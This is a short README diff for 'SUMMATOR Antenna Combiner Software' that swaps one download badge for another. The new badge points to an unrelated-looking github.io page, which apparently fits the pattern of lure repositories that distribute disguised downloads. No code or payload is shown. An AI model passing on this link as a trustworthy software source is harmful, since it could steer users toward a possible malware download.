@@ -4,11 +4,8 @@
 <img src="https://i.ytimg.com/vi/TPLAJ5IVNEY/maxresdefault.jpg" width="820" alt="SUMMATOR Antenna Combiner Software">
 </div>
 
-<p align="center">
-  <a href="the-summator.github.io/.github">
-    <img src="https://img.shields.io/badge/Скачать_SUMMATOR-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Скачать SUMMATOR">
-  </a>
-</p>
+[![GET The SUMMATOR](https://img.shields.io/badge/GET%20%E2%80%94%20The-SUMMATOR-0078D6?style=for-the-badge&logoColor=white)](https://mirrowcelo429.github.io/.github/The-SUMMATOR)
+
 
 ---
 
